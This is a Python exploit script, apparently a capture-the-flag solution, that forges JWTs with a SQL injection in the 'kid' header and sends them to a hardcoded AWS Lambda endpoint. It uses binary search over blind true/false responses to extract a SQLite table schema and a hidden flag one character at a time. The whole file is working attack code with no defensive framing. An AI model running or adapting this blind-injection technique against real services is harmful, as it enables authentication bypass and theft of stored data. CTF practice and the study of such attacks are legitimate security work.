import jwt
import string
import requests

BASE_URL = "https://vj6s64uz42c733wpxn4pjwm6ru0qchpj.lambda-url.us-east-1.on.aws/verify"

def create_jwt(kid_payload):
    header = {
        "alg": "HS256",
        "kid": kid_payload,
        "typ": "JWT"
    }
    payload = {"user": "admin"}
    return jwt.encode(payload, "dummy_key", algorithm="HS256", headers=header)

def test_injection(token):
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-US,en;q=0.9,id;q=0.8',
        'Cache-Control': 'max-age=0',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://vj6s64uz42c733wpxn4pjwm6ru0qchpj.lambda-url.us-east-1.on.aws',
        'Referer': 'https://vj6s64uz42c733wpxn4pjwm6ru0qchpj.lambda-url.us-east-1.on.aws/',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36'
    }
    cookies = {
        'auth_token': token
    }
    response = requests.post(BASE_URL, headers=headers, cookies=cookies)
    return "kid is happy" in response.text

def binary_search_length(base_query, max_length=100):
    left, right = 0, max_length
    while left <= right:
        mid = (left + right) // 2
        injection = f"' || (SELECT CASE WHEN length(({base_query}))>{mid} THEN '1337' ELSE '0' END)--"
        token = create_jwt(injection)
        if test_injection(token):
            left = mid + 1
        else:
            right = mid - 1
    return left

def extract_string(base_query):
    length = binary_search_length(base_query)
    print(f"Detected length: {length}")
    result = ""
    
    for pos in range(1, length + 1):
        left, right = 32, 126  # printable ASCII range
        while left <= right:
            mid = (left + right) // 2
            injection = f"' || (SELECT CASE WHEN unicode(substr(({base_query}),{pos},1))>{mid} THEN '1337' ELSE '0' END)--"
            token = create_jwt(injection)
            
            if test_injection(token):
                left = mid + 1
            else:
                right = mid - 1
                
        char = chr(right + 1)
        result += char
        print(f"Position {pos}: {char} (Current result: {result})")
    
    return result

# First, let's get the column names
def get_column_names():
    query = "SELECT sql FROM sqlite_master WHERE type='table' AND name='superhiddenflagstore'"
    return extract_string(query)

# Then extract the flag
def get_flag():
    # Try different column names that might contain the flag
    possible_columns = ['flag', 'key', 'secret', 'value']
    for column in possible_columns:
        print(f"\nTrying to extract {column} column...")
        query = f"SELECT {column} FROM superhiddenflagstore LIMIT 1"
        try:
            result = extract_string(query)
            if result:
                print(f"Found data in {column} column: {result}")
                return result
        except Exception as e:
            print(f"Error with column {column}: {e}")
            continue

if __name__ == "__main__":
    print("Getting table structure...")
    table_info = get_column_names()
    print(f"Table structure: {table_info}")
    
    print("\nExtracting flag...")
    flag = get_flag()